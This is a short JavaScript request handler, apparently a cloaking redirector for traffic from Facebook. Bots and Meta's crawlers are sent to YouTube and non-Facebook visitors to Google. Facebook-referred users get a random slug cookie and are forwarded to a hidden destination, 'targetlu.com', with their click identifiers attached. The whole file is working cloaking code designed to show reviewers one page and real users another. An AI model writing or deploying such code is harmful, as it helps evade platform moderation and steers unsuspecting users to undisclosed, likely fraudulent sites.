export default async function handler(req, res) {

  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const referer = (req.headers["referer"] || "").toLowerCase();
  const url = new URL(req.url, `https://${req.headers.host}`);
  const path = url.pathname;

  const cookies = req.headers.cookie || "";
  const query = url.search; // 🔥 ambil ?fbclid dll

  // ===== DETEKSI =====
  const isBot =
    ua.includes("bot") ||
    ua.includes("crawl") ||
    ua.includes("spider") ||
    ua.includes("facebookexternalhit") ||
    ua.includes("meta-externalagent") ||
    ua.includes("curl");

  const isFB =
    referer.includes("facebook");

  // ===== ROOT =====
  if (path === "/") {

    // BOT → YOUTUBE + query ikut
    if (isBot) {
      return res.writeHead(301, {
        Location: "https://www.youtube.com/" + query
      }).end();
    }

    // NON FB → GOOGLE + query ikut
    if (!isFB) {
      return res.writeHead(301, {
        Location: "https://www.google.com/" + query
      }).end();
    }

    // ===== COOKIE SLUG =====
    let slug = null;

    if (cookies.includes("slug=")) {
      slug = cookies.split("slug=")[1].split(";")[0];
    }

    if (!slug) {
      slug = "pusat-" + Math.random().toString(36).substring(2, 10);
    }

    return res.writeHead(302, {
      Location: "/" + slug + query, // 🔥 query ikut ke slug juga
      "Set-Cookie": `slug=${slug}; path=/; max-age=86400`
    }).end();
  }

  // ===== SLUG =====
  if (path !== "/") {
    return res.writeHead(302, {
      Location: "https://targetlu.com/" + query // 🔥 ikut terus
    }).end();
  }
}
